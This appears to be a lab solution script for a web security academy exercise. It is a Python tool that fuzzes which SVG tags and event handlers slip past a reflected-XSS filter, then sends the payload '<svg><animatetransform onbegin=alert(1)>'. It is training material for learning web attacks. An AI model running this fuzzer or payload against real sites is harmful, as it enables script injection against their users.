# Reflected XSS with some SVG markup allowed

> This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
> To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.

```python
"""
LAB: Reflected XSS with some SVG markup allowed
TYPE: Reflected XSS
"""
import requests
import sys

BASE_URL = "https://0ad5002904b4baad809a036600e80035.h1-web-security-academy.net/"

def fuzz_tags(url):
    print("[*] Fuzzing Tags...")
    # Essential SVG tags to test
    tags = ["svg", "animatetransform", "circle", "image", "title", "rect"]
    
    for tag in tags:
        payload = {"search": f"<{tag}>"}
        response = requests.get(url, params=payload)
        
        # Simple feedback
        sys.stdout.write(f"\rTesting: {tag}   ")
        sys.stdout.flush()
        
        if response.status_code == 200:
            print(f"\n[+] ALLOWED TAG: {tag}")

def fuzz_attributes(url):
    print("\n[*] Fuzzing Attributes (using <svg>)...")
    # Essential SVG attributes to test
    attributes = ["onbegin", "onload", "onclick", "onmouseover"]
    
    for attr in attributes:
        payload = {"search": f"<svg {attr}=1>"}
        response = requests.get(url, params=payload)
        
        sys.stdout.write(f"\rTesting: {attr}   ")
        sys.stdout.flush()
        
        if response.status_code == 200:
            print(f"\n[+] ALLOWED ATTRIBUTE: {attr}")

def exploit(url):
    print("\n" + "-"*30)
    print("[*] SENDING PAYLOAD")
    
    # The known solution
    payload_str = "<svg><animatetransform onbegin=alert(1)>"
    
    payload = {"search": payload_str}
    response = requests.get(url, params=payload)
    
    if "Congratulations" in response.text:
        print("[+] SUCCESS: Lab Solved.")
    else:
        print("[-] Payload sent. Check browser.")

if __name__ == "__main__":
    fuzz_tags(BASE_URL)
    fuzz_attributes(BASE_URL)
    exploit(BASE_URL)
```